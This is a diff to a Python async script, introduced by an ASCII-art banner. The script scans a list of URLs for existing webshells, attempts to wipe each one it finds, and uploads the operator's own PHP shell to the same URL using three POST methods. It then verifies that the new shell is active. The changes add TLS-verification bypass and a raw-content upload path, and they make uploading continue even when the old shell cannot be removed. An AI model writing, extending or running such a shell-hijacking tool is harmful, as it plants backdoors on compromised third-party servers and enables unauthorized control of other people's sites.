@@ -2,6 +2,7 @@ import os
 import sys
 import asyncio
 import aiohttp
+import aiofiles
 import logging
 from datetime import datetime
 
@@ -26,7 +27,7 @@ print(purple + """…………………▄▄▄▄▄▄▄▄▄▄▄▄▄�
 ..█▐▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒█▓█        ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░                   
 …█▓█▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒█▌▓█  ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░  
 ..█▓▓█▒░░░░▒█▄▒▒░░░░░░░░░▒▒▄█▒░░░░▒█▓▓█                                                                               
-..█▓█▒░▒▒▒▒░░▀▀█▄▄░░░░░▄▄█▀▀░░▒▒▒▒░▒█▓█ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░
+..█▓█▒░▒▒▒▒░░▀▀█▄▄░░░░░▄▄█▀▀░░▒▒▒▒░▒█▓█ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒ Indexing
 .█▓▌▒▒▓▓▓▓▄▄▄▒▒▒▀█░░░░█▀▒▒▒▄▄▄▓▓▓▓▒▒▐▓ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 .██▌▒▓███▓█████▓▒▐▌░░▐▌▒▓████▓████▓▒▐██░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
 ..██▒▒▓███▓▓▓████▓▄░░░▄▓████▓▓▓███▓▒▒██░▒▓█▓▒░      ░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░ 
@@ -56,32 +57,32 @@ print(purple + """…………………▄▄▄▄▄▄▄▄▄▄▄▄▄�
 webshell_extensions = ['.php', '.asp', '.aspx', '.jsp', '.file', '.phtml', '.php3', '.php4', '.php5']
 webshell_keywords = ['system', 'upload', 'eval', 'exec', 'shell_exec', 'passthru', 'cmd', 'webshell', 'backdoor', 'phpinfo', 'fopen', 'file_put_contents']
 
-async def check_webshell(session, url, shell_file_path, output_file, uploaded_file):
+async def check_webshell(session, url, shell_file_path):
     try:
         logger.info(f"Checking URL: {url}")
-        async with session.get(url, timeout=10) as response:
+        async with session.get(url, timeout=10, ssl=False) as response:
             if response.status == 200:
                 file_contents = await response.text()
                 if any(keyword in file_contents.lower() for keyword in webshell_keywords):
                     print(f"\033[1;32mFound: {url}\033[0m")
                     logger.info(f"Active shell detected at: {url}")
-                    async with output_file:
+                    async with aiofiles.open('foundshells.txt', 'a') as output_file:
                         await output_file.write(url + '\n')
                     
                     # Attempt to remove old shell by overwriting with empty content
                     try:
-                        async with session.post(url, data='', timeout=10) as remove_response:
+                        async with session.post(url, data='', timeout=10, ssl=False) as remove_response:
                             if remove_response.status == 200:
                                 print(f"\033[1;33mRemoved old shell: {url}\033[0m")
                                 logger.info(f"Successfully removed old shell at: {url}")
                             else:
                                 print(f"\033[1;31mFailed to remove old shell: {url} (Status: {remove_response.status})\033[0m")
                                 logger.warning(f"Failed to remove old shell at: {url} (Status: {remove_response.status})")
-                                return
+                                # Continue to upload even if removal fails
                     except Exception as e:
                         print(f"\033[1;31mError removing old shell {url}: {e}\033[0m")
                         logger.error(f"Error removing old shell at {url}: {e}")
-                        return
+                        # Continue to upload even if removal fails
 
                     # Attempt to upload new shell using multiple methods
                     try:
@@ -91,15 +92,15 @@ async def check_webshell(session, url, shell_file_path, output_file, uploaded_fi
                         # Method 1: Standard multipart form upload
                         data = aiohttp.FormData()
                         data.add_field('file', shell_content, filename=os.path.basename(shell_file_path), content_type='application/x-php')
-                        async with session.post(url, data=data, headers={'Content-Type': 'multipart/form-data'}, timeout=10) as upload_response:
+                        async with session.post(url, data=data, headers={'Content-Type': 'multipart/form-data'}, timeout=10, ssl=False) as upload_response:
                             if upload_response.status == 200:
                                 print(f"\033[1;32mSuccessfully uploaded new shell to: {url} (Method 1)\033[0m")
                                 logger.info(f"Successfully uploaded new shell to: {url} (Method 1)")
-                                async with uploaded_file:
+                                async with aiofiles.open('uploadedshells.txt', 'a') as uploaded_file:
                                     await uploaded_file.write(url + '\n')
                                 
-                                # Verify upload by checking if the shell is accessible
-                                async with session.get(url, timeout=5) as verify_response:
+                                # Verify upload
+                                async with session.get(url, timeout=5, ssl=False) as verify_response:
                                     if verify_response.status == 200 and any(keyword in (await verify_response.text()).lower() for keyword in webshell_keywords):
                                         print(f"\033[1;32mVerified: New shell active at {url}\033[0m")
                                         logger.info(f"Verified: New shell active at {url}")
@@ -113,15 +114,15 @@ async def check_webshell(session, url, shell_file_path, output_file, uploaded_fi
                                 # Method 2: Alternative form field name
                                 data_alt = aiohttp.FormData()
                                 data_alt.add_field('upload', shell_content, filename=os.path.basename(shell_file_path), content_type='application/x-php')
-                                async with session.post(url, data=data_alt, headers={'Content-Type': 'multipart/form-data'}, timeout=10) as upload_response_alt:
+                                async with session.post(url, data=data_alt, headers={'Content-Type': 'multipart/form-data'}, timeout=10, ssl=False) as upload_response_alt:
                                     if upload_response_alt.status == 200:
                                         print(f"\033[1;32mSuccessfully uploaded new shell to: {url} (Method 2)\033[0m")
                                         logger.info(f"Successfully uploaded new shell to: {url} (Method 2)")
-                                        async with uploaded_file:
+                                        async with aiofiles.open('uploadedshells.txt', 'a') as uploaded_file:
                                             await uploaded_file.write(url + '\n')
                                         
                                         # Verify upload
-                                        async with session.get(url, timeout=5) as verify_response:
+                                        async with session.get(url, timeout=5, ssl=False) as verify_response:
                                             if verify_response.status == 200 and any(keyword in (await verify_response.text()).lower() for keyword in webshell_keywords):
                                                 print(f"\033[1;32mVerified: New shell active at {url}\033[0m")
                                                 logger.info(f"Verified: New shell active at {url}")
@@ -131,6 +132,26 @@ async def check_webshell(session, url, shell_file_path, output_file, uploaded_fi
                                     else:
                                         print(f"\033[1;31mFailed to upload new shell to: {url} (Method 2, Status: {upload_response_alt.status})\033[0m")
                                         logger.warning(f"Failed to upload new shell to: {url} (Method 2, Status: {upload_response_alt.status})")
+                                
+                                # Method 3: Raw content POST
+                                async with session.post(url, data=shell_content, headers={'Content-Type': 'application/x-php'}, timeout=10, ssl=False) as upload_response_raw:
+                                    if upload_response_raw.status == 200:
+                                        print(f"\033[1;32mSuccessfully uploaded new shell to: {url} (Method 3)\033[0m")
+                                        logger.info(f"Successfully uploaded new shell to: {url} (Method 3)")
+                                        async with aiofiles.open('uploadedshells.txt', 'a') as uploaded_file:
+                                            await uploaded_file.write(url + '\n')
+                                        
+                                        # Verify upload
+                                        async with session.get(url, timeout=5, ssl=False) as verify_response:
+                                            if verify_response.status == 200 and any(keyword in (await verify_response.text()).lower() for keyword in webshell_keywords):
+                                                print(f"\033[1;32mVerified: New shell active at {url}\033[0m")
+                                                logger.info(f"Verified: New shell active at {url}")
+                                            else:
+                                                print(f"\033[1;31mVerification failed for new shell at {url}\033[0m")
+                                                logger.warning(f"Verification failed for new shell at {url}")
+                                    else:
+                                        print(f"\033[1;31mFailed to upload new shell to: {url} (Method 3, Status: {upload_response_raw.status})\033[0m")
+                                        logger.warning(f"Failed to upload new shell to: {url} (Method 3, Status: {upload_response_raw.status})")
                     except Exception as e:
                         print(f"\033[1;31mError uploading new shell to {url}: {e}\033[0m")
                         logger.error(f"Error uploading new shell to {url}: {e}")
@@ -145,6 +166,8 @@ async def check_webshell(session, url, shell_file_path, output_file, uploaded_fi
         logger.error(f"Error checking URL {url}: {e}")
 
 async def detect_webshell_from_urls(file_path, shell_file_path):
+    found_shells = 0
+    uploaded_shells = 0
     try:
         # Read URLs from file
         with open(file_path, 'r') as url_file:
@@ -153,23 +176,24 @@ async def detect_webshell_from_urls(file_path, shell_file_path):
         
         # Initialize aiohttp session
         async with aiohttp.ClientSession() as session:
-            # Open output files
-            output_file = open('foundshells.txt', 'a')
-            uploaded_file = open('uploadedshells.txt', 'a')
-            
             tasks = []
             for url in urls:
                 if os.path.splitext(url)[1].lower() in webshell_extensions:
-                    tasks.append(check_webshell(session, url, shell_file_path, output_file, uploaded_file))
+                    tasks.append(check_webshell(session, url, shell_file_path))
             
             # Run all tasks concurrently
             logger.info(f"Starting scan for {len(tasks)} URLs with valid extensions")
-            await asyncio.gather(*tasks, return_exceptions=True)
+            results = await asyncio.gather(*tasks, return_exceptions=True)
             
-            # Close files
-            output_file.close()
-            uploaded_file.close()
-            logger.info("Scan completed, output files closed")
+            # Count successful detections and uploads
+            for result in results:
+                if isinstance(result, tuple):
+                    found, uploaded = result
+                    found_shells += found
+                    uploaded_shells += uploaded
+            
+            logger.info(f"Scan completed. Found {found_shells} shells, successfully uploaded {uploaded_shells} shells")
+            print(f"\033[1;34mScan Summary: Found {found_shells} shells, successfully uploaded {uploaded_shells} shells\033[0m")
             
     except KeyboardInterrupt:
         print("\nExecution stopped by user. Results saved.")
